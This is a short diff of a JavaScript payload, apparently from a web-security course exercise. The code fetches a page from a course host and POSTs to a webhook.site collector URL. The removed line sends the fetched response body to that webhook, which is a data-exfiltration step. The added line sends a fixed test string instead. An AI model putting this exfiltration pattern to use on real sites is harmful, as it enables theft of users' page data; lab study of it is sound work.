@@ -10,9 +10,9 @@
             xhr.open("GET", "https://cats.is-course.ru", true);
             xhr.onload = function() {
                 // Send the response body to your webhook site
-                var sendData = xhr.responseText;
+                // var sendData = xhr.responseText;
                 var sendReq = new XMLHttpRequest();
-                sendReq.open("POST", "https://webhook.site/65d06db1-3fc0-4e77-954d-3d0380378094?"+xhr.responseText, true);
+                sendReq.open("POST", "https://webhook.site/65d06db1-3fc0-4e77-954d-3d0380378094?QWERTY", true);
                 sendReq.send();
             };
             xhr.send();
